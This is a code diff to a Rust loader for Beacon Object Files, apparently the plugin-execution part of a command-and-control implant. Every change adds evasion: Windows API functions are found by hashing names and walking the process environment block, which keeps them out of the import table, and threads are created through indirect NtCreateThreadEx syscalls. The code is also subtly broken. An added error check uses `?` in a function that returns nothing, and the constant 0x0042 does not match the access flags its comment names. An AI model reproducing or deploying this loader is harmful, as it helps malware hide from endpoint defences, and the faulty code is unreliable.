@@ -41,10 +41,10 @@ use winapi::shared::minwindef::{DWORD, LPVOID, UINT};
 use winapi::shared::ntdef::HRESULT;
 use winapi::shared::winerror::S_OK;
 // CloseHandle removed — using NtClose indirect syscall
-use winapi::um::libloaderapi::{GetProcAddress, LoadLibraryA};
+// LoadLibraryA/GetProcAddress removed — using pe_resolve dynamic resolution
 // VirtualAlloc/VirtualFree/VirtualProtect removed — using Nt* indirect syscalls
 // CreateThread/WaitForSingleObject removed — using NtCreateThreadEx/NtWaitForSingleObject indirect syscalls
-use winapi::um::synchapi::CreateEventW;
+// CreateEventW removed — was unused
 use winapi::um::winbase::WAIT_OBJECT_0;
 use winapi::um::winnt::{
     MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE,
@@ -59,6 +59,8 @@ const MAX_COF_SIZE: usize = 1024 * 1024;
 const MAX_ARGS: usize = 32;
 /// Default execution timeout (seconds).
 const DEFAULT_TIMEOUT_SECS: u64 = 60;
+/// Minimal thread access for BOF execution: THREAD_QUERY_LIMITED_INFORMATION | THREAD_TERMINATE.
+const THREAD_WAIT_ACCESS: u64 = 0x0042;
 /// Machine type for AMD64 (x86-64).
 const IMAGE_FILE_MACHINE_AMD64: u16 = 0x8664;
 /// Machine type for i386 (x86).
@@ -168,7 +170,10 @@ fn ensure_output_buffer() -> *mut u8 {
 unsafe fn append_output(data: &[u8]) {
     let len = OUTPUT_BUFFER_LEN.load(Ordering::SeqCst);
     let cap = OUTPUT_BUFFER_CAP.load(Ordering::SeqCst);
-    let needed = len + data.len();
+    // P2-07: Overflow check for buffer size calculation.
+    let needed = len.checked_add(data.len()).ok_or_else(|| {
+        std::io::Error::new(std::io::ErrorKind::InvalidData, "buffer overflow in append_output")
+    })?;
 
     if needed > cap {
         let new_cap = (needed * 2).max(4096);
@@ -310,19 +315,15 @@ unsafe extern "C" fn beacon_data_extract(parser: *mut BeaconDataParser, size: *m
 
 /// `BeaconPrintf(type, fmt, ...)` — formatted output to the callback buffer.
 /// We ignore `type` (CS uses it to distinguish output types) and just format.
+///
+/// NOTE: Rust cannot safely access C variadic arguments (VaList is
+/// platform-fragile).  We emit the format string literally without
+/// %-expansion.  BOFs that need formatted output should use
+/// BeaconOutput or BeaconOutputPrintf instead.
 unsafe extern "C" fn beacon_printf(_typ: i32, fmt: *const i8, ...) -> i32 {
     if fmt.is_null() {
         return 0;
     }
-    // Use a fixed-size stack buffer for vsnprintf.
-    let mut buf = [0u8; 8192];
-    let mut args: std::ffi::VaListImpl;
-    std::arch::asm!("", options(nostack));
-    args = std::mem::zeroed(); // placeholder
-
-    // We can't safely do variadic args in Rust without libc's vsnprintf.
-    // Instead, use a simpler approach: format what we can.
-    // For now, just read the format string literally (no % expansion).
     let fmt_str = std::ffi::CStr::from_ptr(fmt);
     let bytes = fmt_str.to_bytes();
     append_output(bytes);
@@ -596,7 +597,7 @@ fn build_internal_symbols() -> Vec<SymbolEntry> {
 }
 
 /// Resolve a `DLL$Function` symbol by dynamically loading the DLL and finding
-/// the function.
+/// the function via pe_resolve (no IAT entries).
 unsafe fn resolve_dynamic_symbol(name: &str) -> Option<*const c_void> {
     let parts: Vec<&str> = name.splitn(2, '$').collect();
     if parts.len() != 2 {
@@ -605,32 +606,67 @@ unsafe fn resolve_dynamic_symbol(name: &str) -> Option<*const c_void> {
     let dll_name = parts[0];
     let func_name = parts[1];
 
-    // Build null-terminated C strings.
-    let dll_cstr = std::ffi::CString::new(dll_name).ok()?;
-    let func_cstr = std::ffi::CString::new(func_name).ok()?;
+    // Build a null-terminated UTF-16 wide string for the DLL name.
+    let dll_name_wide: Vec<u16> = dll_name.encode_utf16().chain(std::iter::once(0)).collect();
 
-    let module = LoadLibraryA(dll_cstr.as_ptr() as *const i8);
-    if module.is_null() {
-        log::warn!("[coff_loader] LoadLibraryA('{}') failed", dll_name);
-        return None;
-    }
+    // Try to find the module already loaded in the PEB.
+    let module = match pe_resolve::get_module_handle_by_hash(
+        pe_resolve::hash_wstr(&dll_name_wide[..dll_name_wide.len() - 1]),
+    ) {
+        Some(base) => base as *mut c_void,
+        None => {
+            // Module not loaded yet — resolve LoadLibraryW via pe_resolve and load it.
+            let kernel32 = match pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL) {
+                Some(b) => b,
+                None => {
+                    log::warn!("[coff_loader] cannot resolve kernel32");
+                    return None;
+                }
+            };
+            let llw_addr = match pe_resolve::get_proc_address_by_hash(
+                kernel32,
+                pe_resolve::hash_str(b"LoadLibraryW\0"),
+            ) {
+                Some(a) => a,
+                None => {
+                    log::warn!("[coff_loader] cannot resolve LoadLibraryW");
+                    return None;
+                }
+            };
+            let load_library_w: unsafe extern "system" fn(*const u16) -> *mut c_void =
+                std::mem::transmute(llw_addr);
+            let mod_handle = load_library_w(dll_name_wide.as_ptr());
+            if mod_handle.is_null() {
+                log::warn!("[coff_loader] LoadLibraryW('{}') failed", dll_name);
+                return None;
+            }
+            mod_handle
+        }
+    };
 
-    let proc = GetProcAddress(module, func_cstr.as_ptr() as *const i8);
-    if proc.is_null() {
-        log::warn!(
-            "[coff_loader] GetProcAddress('{}', '{}') failed",
-            dll_name,
-            func_name
-        );
-        return None;
-    }
+    // Build a null-terminated C string for the function name hash.
+    let func_bytes = format!("{}\0", func_name);
+    let proc = match pe_resolve::get_proc_address_by_hash(
+        module as usize,
+        pe_resolve::hash_str(func_bytes.as_bytes()),
+    ) {
+        Some(addr) => addr as *const c_void,
+        None => {
+            log::warn!(
+                "[coff_loader] cannot resolve '{}' in '{}'",
+                func_name,
+                dll_name
+            );
+            return None;
+        }
+    };
 
     log::debug!(
         "[coff_loader] resolved {} at {:#x}",
         name,
         proc as usize
     );
-    Some(proc as *const c_void)
+    Some(proc)
 }
 
 /// Look up a symbol name against the internal table first, then dynamic.
@@ -1101,7 +1137,7 @@ pub unsafe fn execute_bof(
     let thread_status = syscall!(
         "NtCreateThreadEx",
         &mut thread_handle_raw as *mut _ as u64, // ThreadHandle
-        0x1FFFFFu64,                               // THREAD_ALL_ACCESS
+        THREAD_WAIT_ACCESS,                              // minimal thread access
         std::ptr::null::<u64>() as u64,            // ObjectAttributes
         (-1isize) as u64,                          // NtCurrentProcess()
         Some(std::mem::transmute(go_fn as *const c_void)) as *const _ as u64, // StartRoutine
